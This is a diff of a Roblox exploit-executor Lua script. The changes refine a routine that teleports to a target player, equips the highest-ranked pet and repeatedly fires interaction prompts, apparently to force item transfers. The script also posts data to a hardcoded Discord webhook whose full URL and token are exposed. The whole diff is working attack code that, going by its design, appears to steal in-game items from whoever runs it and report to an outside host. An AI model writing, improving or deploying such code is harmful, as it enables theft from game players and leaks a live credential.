@@ -3,7 +3,7 @@ local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
-local TeleportService = game:GetService("TeleportService")
+local UserInputService = game:GetService("UserInputService")
 
 -- CONFIG (REPLACE WITH YOUR WEBHOOK)
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
@@ -19,14 +19,21 @@ local PET_PRIORITY = {
     ["Butterfly"] = 65
 }
 
+-- ITEMS TO IGNORE
+local IGNORE_ITEMS = {
+    "Shovel",
+    "Destroy Plants"
+}
+
 --[[ WEBHOOK FUNCTIONS ]]--
 local function sendWebhook(content, embed)
     local payload = {
         content = content,
         embeds = {embed}
     }
-    pcall(function()
-        HttpService:RequestAsync({
+    
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {
@@ -35,6 +42,10 @@ local function sendWebhook(content, embed)
             Body = HttpService:JSONEncode(payload)
         })
     end)
+    
+    if not success then
+        warn("Webhook failed: "..tostring(response))
+    end
 end
 
 local function sendInitialData()
@@ -72,6 +83,17 @@ local function getBestItem()
     local bestItem, highestScore = nil, 0
     
     for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
+        -- Skip ignored items
+        local shouldIgnore = false
+        for _,ignore in pairs(IGNORE_ITEMS) do
+            if string.find(item.Name, ignore) then
+                shouldIgnore = true
+                break
+            end
+        end
+        if shouldIgnore then continue end
+        
+        -- Check pet priority
         local score = 0
         for pet, points in pairs(PET_PRIORITY) do
             if string.find(item.Name, pet) then
@@ -89,12 +111,33 @@ local function getBestItem()
     return bestItem
 end
 
+--[[ PRECISE INTERACTION ]]--
+local function findInteractPart(targetChar)
+    -- First check for ProximityPrompt
+    for _,part in pairs(targetChar:GetDescendants()) do
+        if part:IsA("ProximityPrompt") then
+            return part.Parent, part
+        end
+    end
+    
+    -- Fallback to torso if no prompt found
+    return targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+end
+
+local function getScreenPosition(part)
+    local vector, onScreen = Camera:WorldToViewportPoint(part.Position)
+    if onScreen then
+        return Vector2.new(vector.X, vector.Y)
+    end
+    return Vector2.new(0.5, 0.5) -- Fallback to center
+end
+
 --[[ TARGET INTERACTION ]]--
 local function interactWithPlayer(target)
     -- Teleport to target
     local targetChar = target.Character or target.CharacterAdded:Wait()
-    local torso = targetChar:WaitForChild("UpperTorso") or targetChar:WaitForChild("Torso")
-    LocalPlayer.Character.HumanoidRootPart.CFrame = torso.CFrame * CFrame.new(0, 0, -4)
+    local interactPart, prompt = findInteractPart(targetChar)
+    LocalPlayer.Character.HumanoidRootPart.CFrame = interactPart.CFrame * CFrame.new(0, 0, -4)
 
     -- Force first-person
     LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
@@ -104,7 +147,7 @@ local function interactWithPlayer(target)
     -- Look at target
     local lookConn
     lookConn = RunService.Heartbeat:Connect(function()
-        Camera.CFrame = CFrame.new(Camera.CFrame.Position, torso.Position)
+        Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
     end)
 
     -- Equip best item
@@ -113,10 +156,27 @@ local function interactWithPlayer(target)
         LocalPlayer.Character.Humanoid:EquipTool(item)
     end
 
-    -- Auto-interact for 5 seconds
-    mouse1press()
-    task.wait(5)
-    mouse1release()
+    -- Calculate screen position for interaction
+    local screenPos = getScreenPosition(interactPart)
+    UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
+    
+    -- Handle interaction
+    if prompt then
+        -- Use proximity prompt if available
+        fireproximityprompt(prompt)
+        task.wait(0.1)
+        local startTime = os.clock()
+        while os.clock() - startTime < 5 do
+            if not prompt.Enabled then break end
+            fireproximityprompt(prompt)
+            task.wait(0.1)
+        end
+    else
+        -- Fallback to mouse click
+        mouse1press()
+        task.wait(5)
+        mouse1release()
+    end
 
     -- Cleanup
     if lookConn then lookConn:Disconnect() end
